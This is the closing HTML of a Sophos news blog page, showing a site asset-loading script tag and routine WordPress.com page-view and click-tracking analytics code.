<script type='text/javascript' src='https://news.sophos.com/_static/??-eJyVkEEOwiAQRS8kIF20K+NRDLZjS8sAYcDq7R3TNHHhomTY8Hnvk4xao+iDz+CzyhMgkKIQp0AeVhLNWXdqJj4MhcWCeDaykZoDuQVyppM61NGHVEHDKydDx/ktkiVbV2/1BqOxo68Wo0nZQ6r2RlOtfLNdsr53ZQDa1orIBSJBdG+J1v+D+Ap4h+H3ff8Zi4iujNaTMoslhKxu7KpHSMjsFS+65em0PrfzB20wygw='></script>
<script src='https://stats.wp.com/e-202112.js' defer></script>
<script>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:9.5.2',blog:'166161023',post:'73028',tz:'-4',srv:'news.sophos.com'} ]);
	_stq.push([ 'clickTrackerInit', '166161023', '73028' ]);
</script>
</body>
</html>
